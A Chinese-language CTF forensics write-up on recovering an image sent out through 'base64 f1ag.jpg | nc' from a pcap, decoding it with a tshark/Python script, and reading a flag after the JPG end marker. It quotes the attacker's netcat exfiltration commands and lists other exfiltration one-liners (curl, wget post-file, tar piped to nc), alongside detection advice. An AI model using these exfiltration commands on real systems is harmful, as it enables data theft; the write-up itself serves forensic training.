---
id: ctf-forensics-pcap-shell-history-base64-nc-image-exfil
title: pcap shell 历史还原 base64 外传图片：nc 传输与 JPG 尾部 flag
type: scenario
domain: ctf
path: ctf/forensics
technique: pcap-shell-history-base64-nc-image-exfil
tags:
- ctf
- forensics
- pcap
- shell-history
- base64
- nc
- exfiltration
cve: []
severity: info
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:53:37+08:00'
  notes: 已对照原文与图 20/22 核对：pcap 中 shell 历史、base64 f1ag.jpg | nc 192.168.56.102 4444、重试与 rm tmp.file、JPG FF D9 后 flag 均一致；未复跑提取脚本。
url: /docs/ctf/forensics/ctf-forensics-pcap-shell-history-base64-nc-image-exfil/
draft: false
kb_aliases:
- pcap shell history 外传
- base64 nc 外传图片
- TCP 流还原 base64
- f1ag.jpg
- exFill
---

## 一句话结论

当 pcap 里能看到交互式 Linux shell 的命令与输出时，可从 `base64 f1ag.jpg | nc <ip> 4444` 这类命令定位外传流，按 TCP 流把 base64 文本拼回、解码成图片，再用 `sha256sum` 校验；图片 `FF D9` 之后若还有数据，用十六进制编辑器/`strings` 即可看到 flag。

## 原理

- **交互式 shell 在 pcap 中可见**：如果攻击者通过未加密的 telnet/reverse shell/交互式 TCP 会话执行命令，pcap 的 TCP 流会同时包含命令回显与输出；`Follow TCP Stream` 可直接读到 `id`、`pwd`、`cat /etc/passwd`、`ls -la`、`sha256sum`、`base64 ... | nc ...` 等。
- **base64 + nc 外传**：`base64 f1ag.jpg | nc 192.168.56.102 4444` 把二进制图片编码成 ASCII 文本，避免二进制在终端/网络中的编码问题；攻击者接收 base64 后解码即可还原文件。`base64 f1ag.jpg > tmp.file` + `nc <ip> 4444 < tmp.file` 是失败后重试的变体（第一次漏了端口，报 `no port[s] to connect to`）。
- **还原**：从 TCP 流中提取 base64 段（去掉 shell 提示符/命令回显/换行），`base64 -d` 解码；用命令中出现的 `sha256sum` 值校验完整性。
- **尾部 flag**：JPG 以 `FF D9` 结束；出题人可能在 `FF D9` 之后追加明文 flag，`binwalk`/`strings`/010 Editor 搜索 `FF D9` 后的可读字符串即可。
- **本题**：pcap 里的 shell 历史显示 root 用户、`/home/msfadmin`、`f1ag.jpg`、base64 外传到 `192.168.56.102:4444`；还原图片后在 JPG 末尾读到 `grodno{it5_was_t00_s1mple_=D}`。

## 触发条件

- pcap 中存在明文交互式 shell/反向 shell/Telnet 会话，能看到命令与输出。
- 命令中出现 `base64`、`nc`、`curl`、`scp`、`tar` 等外传/打包工具。
- 外传数据是 base64/hex 文本，可从 TCP 流中拼接。
- 还原出的文件有已知哈希/魔数（JPG/PNG/PDF）可校验。

## 利用步骤

1. Wireshark 打开 pcap，`Statistics → Conversations` 找流量较大的 TCP 流；`Follow TCP Stream` 查看 shell 交互。
2. 搜索 `base64`、`nc`、`f1ag`、`sha256sum` 等关键字，确定外传命令与目标 IP/端口。
3. 把该 TCP 流导出为原始字节/文本；去掉命令回显、提示符、换行和无关输出，只保留 base64 段。
4. `base64 -d` 解码为文件；用 `file`/`xxd` 检查魔数，用命令中给出的 `sha256sum` 校验。
5. 对图片执行 `binwalk`、`strings`、`exiftool`，检查 `FF D9` 之后/文件尾是否有附加数据；必要时用 010 Editor 定位。
6. 提取 flag；若 base64 分段/多流，按时间顺序拼接后再解码。

## PoC

```bash
# 1) 导出 TCP 流（示例 stream 1126）
tshark -r capture.pcap -q -z follow,tcp,ascii,1126 > stream.txt

# 2) 提取 base64 段（按实际提示符/命令回显调整）
python - <<'PY'
import re, base64
s = open("stream.txt", "r", errors="ignore").read()
b64 = "".join(re.findall(r"[A-Za-z0-9+/=]{40,}", s))
open("f1ag.jpg", "wb").write(base64.b64decode(b64))
PY

# 3) 校验与查看尾部
sha256sum f1ag.jpg
xxd f1ag.jpg | tail
strings -a f1ag.jpg | tail
```

说明：PoC 为通用提取流程；实际需按 stream 内容过滤命令回显/提示符。未在本机对附件复跑。

## 变体与关联

- **外传工具**：`nc`、`curl -d @file`、`wget --post-file`、`scp`、`tar | nc`、DNS/ICMP 隧道。
- **编码**：base64、hex、gzip+base64、分卷；按命令/文件头识别。
- **多流/分片**：大文件可能拆多个 TCP 流，按时间/序号拼接。
- **尾部数据**：JPG `FF D9`、PNG `IEND`、ZIP `PK` 后的附加数据是常见藏 flag 位置；参见 [[ctf-misc-png-trailing-data-lcg-xor-base62]]。
- **关联**：[[ctf-forensics-pcap-http-xor-exfil-key-recover]]（HTTP 外传 XOR 解密）、[[ctf-forensics-log-field-base64-fragments]]（日志分段 base64）。

## 检测与防御

- **检测**：监控出站连接中的 `nc`/大流量 base64 文本、异常端口 4444/1337、交互式 shell 命令；DLP 识别 base64 编码的图片/文档。
- **防御**：禁止不必要的出站连接、限制 `nc`/`base64`、使用应用层代理与 TLS 检查；对服务器启用命令审计与 EDR。
- **取证**：保留原始 pcap、导出流、还原文件与哈希；不要在分析机上执行 shell 命令。
